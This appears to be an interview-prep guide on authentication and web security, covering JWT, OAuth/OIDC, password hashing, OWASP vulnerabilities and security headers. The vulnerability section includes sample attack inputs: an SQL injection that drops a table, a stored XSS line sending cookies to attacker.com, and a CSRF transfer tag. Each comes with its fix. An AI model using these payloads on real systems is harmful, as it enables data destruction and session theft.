# Security & Authentication — Interview Deep Dive

## Authentication vs Authorization

```
Authentication (AuthN): WHO are you? Verify identity.
  → Login with username/password → get token

Authorization (AuthZ): WHAT can you do? Verify permissions.
  → "User X can read posts but not delete them"

Common mistake: confusing these.
  401 Unauthorized = actually UNAUTHENTICATED (bad name in HTTP spec)
  403 Forbidden = authenticated but NOT AUTHORIZED
```

---

## JWT (JSON Web Token)

### Structure
```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiIxMjMifQ.SIG

Header:  base64url({ "alg": "HS256", "typ": "JWT" })
Payload: base64url({ "userId": "123", "role": "admin", "exp": 1700000000 })
Signature: HMACSHA256(header + "." + payload, secret)

IMPORTANT: Payload is NOT encrypted — only signed.
Anyone can decode and read the payload.
Never store sensitive data (password, credit card) in JWT.
```

### JWT Flow
```
1. User logs in with credentials
2. Server validates credentials, generates JWT:
   { userId, role, exp: now + 30min }
   Signed with JWT_SECRET
3. Server returns JWT to client
4. Client stores JWT (localStorage or httpOnly cookie)
5. Client sends JWT in every request:
   Authorization: Bearer eyJhbGc...
6. Server validates signature + checks exp → extracts userId/role
7. No DB lookup needed (stateless) — that's JWT's main advantage

Refresh token flow:
  Access token: short-lived (15min–1hr), in memory or cookie
  Refresh token: long-lived (7–30 days), in httpOnly cookie
  When access token expires:
    → POST /auth/refresh with refresh token cookie
    → Server validates refresh token (checks DB — refresh tokens must be revocable!)
    → Issue new access + refresh token (rotation)
    → Old refresh token invalidated
```

### JWT Vulnerabilities
```
1. "none" algorithm attack:
   Attacker changes alg to "none" → signature not verified
   Fix: Always explicitly specify allowed algorithms

2. HS256 vs RS256:
   HS256: symmetric (same secret to sign + verify)
          Risk: server verifying = server that signed
   RS256: asymmetric (private key signs, public key verifies)
          Use when multiple services verify tokens (microservices)

3. Storing JWT in localStorage:
   Risk: XSS can steal it (JavaScript can read localStorage)
   Better: httpOnly cookie (JavaScript can't read it)
   But: CSRF risk with cookies → add SameSite=Strict or CSRF token

4. JWT revocation:
   JWTs are stateless — can't revoke without a blacklist
   Solution: short TTL (15min) + refresh token in DB (can revoke)
   Or: maintain token blacklist in Redis until expiry
```

---

## OAuth 2.0 & OpenID Connect (OIDC)

### OAuth 2.0 Grant Types

```
1. Authorization Code (most secure — use for web/mobile apps)
─────────────────────────────────────────────────────────
User → App: "Login with Google"
App → Google: Redirect to /authorize?client_id=X&scope=email&state=random
Google → User: Login page
User: Enters credentials
Google → App: Redirect back with ?code=AUTH_CODE
App → Google: POST /token { code, client_secret }  (server-to-server, secure)
Google → App: { access_token, refresh_token, id_token }
App: Use access_token to call Google APIs

PKCE (Proof Key for Code Exchange):
  For mobile/SPA (can't keep secret). Client generates:
  code_verifier = random string
  code_challenge = SHA256(code_verifier)
  Sends code_challenge in auth request, code_verifier in token request
  Prevents authorization code interception attacks

2. Client Credentials (machine-to-machine, no user)
─────────────────────────────────────────────────────
ServiceA → AuthServer: POST /token { client_id, client_secret, grant_type=client_credentials }
AuthServer → ServiceA: { access_token }
ServiceA → ServiceB: calls API with access_token

3. Device Code (IoT, smart TV — no keyboard)
─────────────────────────────────────────────
Device → AuthServer: POST /device/code
AuthServer → Device: { device_code, user_code, verification_uri }
Device → User: "Go to example.com/activate, enter code: XKCD-1234"
User: Types code on phone/laptop
Device: Polls AuthServer with device_code → gets access_token
```

### OIDC (OpenID Connect)
```
OAuth 2.0: authorization (access to resources)
OIDC: authentication (identity) — built on top of OAuth 2.0

Adds: id_token (JWT containing user identity info)

id_token claims:
  sub: user identifier
  email, email_verified
  name, picture
  iss: issuer (who signed)
  aud: audience (client_id)
  exp, iat

OIDC = OAuth 2.0 + /userinfo endpoint + id_token

Used by: Google Sign-In, Apple Sign-In, Auth0, Okta
```

---

## Session vs Token-Based Auth

```
Session-Based:
  1. Login → server creates session record in DB → session_id in cookie
  2. Every request: server looks up session_id in DB → gets user
  3. Logout: delete session from DB → immediately invalid

  Pros: Immediate revocation, server controls session
  Cons: DB lookup per request (latency), horizontal scale needs shared session store

Token-Based (JWT):
  1. Login → server issues signed JWT → stored in client
  2. Every request: server validates JWT signature → no DB lookup
  3. Logout: client deletes token (server doesn't know)

  Pros: Stateless, scales easily
  Cons: Can't revoke until expiry (mitigate with short TTL + refresh token)

Production recommendation: JWT for access tokens (stateless, fast),
refresh tokens in DB (revocable). Best of both worlds.
```

---

## Password Security

```
Never store plaintext passwords. Never use MD5 or SHA-1 (too fast!).

Use adaptive hash functions:
  bcrypt:   Work factor 10–12. ~100ms per hash. Standard choice.
  argon2id: Winner of Password Hashing Competition. Better than bcrypt.
  scrypt:   Memory-hard. Harder to GPU-crack.

Why NOT SHA-256 for passwords?
  SHA-256 is fast (designed for performance).
  GPU can compute billions per second → rainbow table / brute force.
  bcrypt is INTENTIONALLY slow → only 100s/sec on GPU.

Salting: unique random salt per user, stored with hash
  Prevents: rainbow table attacks, two users with same password having same hash

bcrypt example (Node.js):
  const hash = await bcrypt.hash(password, 12);   // cost factor 12
  const valid = await bcrypt.compare(input, hash);
```

---

## Common Vulnerabilities (OWASP Top 10)

### 1. SQL Injection
```sql
-- Vulnerable:
const query = `SELECT * FROM users WHERE name = '${input}'`;
input = "' OR 1=1; DROP TABLE users; --"

-- Fix: Parameterized queries (ALWAYS)
const query = "SELECT * FROM users WHERE name = $1";
db.query(query, [input]);
```

### 2. XSS (Cross-Site Scripting)
```
Stored XSS: attacker saves <script>document.cookie→attacker.com</script>
Reflected XSS: malicious link with script in URL parameter

Fix:
  - Escape output: convert < to &lt; etc.
  - Content-Security-Policy header (whitelist of allowed scripts)
  - HttpOnly cookies (JS can't read them)
  - Libraries: DOMPurify for sanitizing HTML
```

### 3. CSRF (Cross-Site Request Forgery)
```
Attacker tricks logged-in user's browser to make request to your site.
Browser automatically sends cookies → request appears authenticated.

Example: <img src="https://bank.com/transfer?to=attacker&amount=1000">
         (bank.com is in user's cookies → authenticated request)

Fix:
  - SameSite=Strict or SameSite=Lax cookie attribute
  - CSRF token: unique per session, in form/header, validated server-side
  - Double Submit Cookie pattern
  - Verify Origin/Referer header
```

### 4. Broken Authentication
```
Problems:
  - Weak passwords allowed
  - No brute-force protection
  - Tokens in URL (logged in access logs)
  - Insecure session IDs (predictable)

Fix:
  - Rate limiting on login endpoint
  - Account lockout after N failures
  - MFA (multi-factor authentication)
  - Never put tokens in URLs
```

### 5. Insecure Direct Object Reference (IDOR)
```
/api/invoices/12345 → returns invoice 12345
Attacker changes to /api/invoices/12346 → gets someone else's invoice!

Fix: Always check if the authenticated user owns the resource:
  SELECT * FROM invoices WHERE id = $1 AND user_id = $2
  If not found → 404 (don't reveal it exists)
```

### 6. Security Misconfiguration
```
- Default credentials unchanged (admin/admin)
- Unnecessary services running
- Stack traces exposed in production (reveals internals)
- Directory listing enabled
- Old TLS versions (TLS 1.0/1.1) allowed

Fix: Disable all unused features. Rotate default credentials.
     Custom error pages. Security headers.
```

---

## Security Headers

```http
# Prevents XSS
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com

# Prevents MIME sniffing
X-Content-Type-Options: nosniff

# Prevents clickjacking
X-Frame-Options: DENY

# Force HTTPS (1 year)
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Disable referrer for cross-origin
Referrer-Policy: strict-origin-when-cross-origin

# Restrict browser features
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

---

## HTTPS/TLS in Production

```
Certificate types:
  DV (Domain Validated): basic, automated (Let's Encrypt)
  OV (Organization Validated): company verified, takes days
  EV (Extended Validation): strict, green bar browser (enterprise)
  Wildcard: *.example.com (covers all subdomains)
  SAN: multiple domains in one cert

Let's Encrypt: free, automated, 90-day certs, auto-renewed
  Use with: certbot + nginx, cert-manager + Kubernetes

TLS termination:
  At LB: LB terminates TLS, plain HTTP to backend (simpler, LB handles certs)
  At app: app handles TLS (end-to-end encryption)
  mTLS: both client AND server authenticate (microservices, zero-trust)
```

---

## Interview Questions

**Q: How do you securely store API keys in a NestJS application?**
A: Never hardcode. Use environment variables loaded from `.env` (not committed to git). In production: AWS Secrets Manager/Parameter Store, HashiCorp Vault, or Kubernetes Secrets (encrypted at rest). Access via ConfigService, never log them. Rotate keys regularly.

**Q: What is the difference between symmetric and asymmetric encryption?**
A: Symmetric: same key for encrypt + decrypt (AES-256). Fast. Problem: key distribution. Asymmetric: public key encrypts, private key decrypts (RSA, EC). Slower. Solves key distribution. In practice: asymmetric to exchange symmetric key, then symmetric for data (TLS does this).

**Q: How would you prevent brute force attacks on a login endpoint?**
A: (1) Rate limiting per IP: 5 attempts per 5 minutes. (2) Account lockout after 10 failures. (3) CAPTCHA after 3 failures. (4) Exponential backoff in response time. (5) Monitor failed login patterns with SIEM. (6) Alert on suspicious IPs.

**Q: What is the difference between hashing, encoding, and encryption?**
A: Encoding (base64): reversible, no key, not security. Hashing (bcrypt, SHA): one-way, can't reverse. Use for passwords, checksums. Encryption (AES): reversible with key. Use for storing sensitive data you need to retrieve. Never use encoding alone for security.
